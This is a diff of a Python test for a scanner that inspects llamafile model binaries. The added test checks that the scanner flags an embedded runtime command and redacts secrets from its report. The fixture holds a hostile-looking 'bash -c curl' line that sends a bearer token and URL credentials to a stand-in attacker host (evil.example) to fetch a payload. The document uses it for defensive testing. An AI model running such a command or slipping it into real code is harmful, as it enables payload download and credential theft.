@@ -68,6 +68,32 @@ def test_llamafile_scanner_flags_suspicious_runtime_strings(tmp_path: Path) -> N
     assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
 
 
+def test_llamafile_scanner_redacts_sensitive_runtime_evidence(tmp_path: Path) -> None:
+    binary = tmp_path / "sensitive-runtime.llamafile"
+    binary.write_bytes(
+        _build_llamafile_blob(
+            runtime_lines=[
+                'bash -c curl -H "Authorization: Bearer sk-runtime-secret1234567890" '
+                "https://user:pass123@evil.example/payload?token=tok_runtime",
+            ]
+        )
+    )
+
+    result = LlamafileScanner().scan(str(binary))
+
+    runtime_issues = [issue for issue in result.issues if "Executable runtime contains" in issue.message]
+    assert runtime_issues
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in runtime_issues)
+
+    details = repr(runtime_issues[0].details)
+    assert "sk-runtime-secret" not in details
+    assert "pass123" not in details
+    assert "tok_runtime" not in details
+    assert "curl" in details
+    assert "evil.example" in details
+    assert "<redacted>" in details
+
+
 def test_llamafile_scanner_does_not_skip_mixed_safe_and_suspicious_runtime_string(tmp_path: Path) -> None:
     binary = tmp_path / "mixed.llamafile"
     binary.write_bytes(
